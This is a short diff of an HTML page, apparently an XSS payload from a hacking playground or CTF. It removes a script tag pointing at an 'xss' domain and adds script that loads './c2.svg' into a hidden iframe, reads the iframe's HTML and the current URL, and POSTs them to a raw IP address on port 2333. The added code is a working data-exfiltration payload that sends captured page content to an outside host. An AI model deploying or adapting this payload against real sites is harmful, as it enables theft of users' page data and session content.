@@ -1,4 +1,28 @@
-<html>
-<script src=https://hackplay.xss.cl></script>
+<body>
+  <div id="r"></div>
+  <script>
+    const ifr = document.createElement('iframe');
+    ifr.style.display = 'none';
+    document.body.appendChild(ifr);
 
-</html>
+    // Set the onload event before setting the src
+    ifr.onload = function() {
+      const ifrContent = ifr.contentWindow.document.documentElement.innerHTML;
+      const data = `current url:<br />${location.href}<br /><br />get data:<br />${ifrContent}`;
+
+      // Send data to the proxy server
+      fetch('http://107.175.91.23:2333', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ data: data })
+      });
+
+      // Display the data on the page
+      document.getElementById('r').innerHTML = data;
+    };
+
+    ifr.src = "./c2.svg";
+  </script>
+</body>
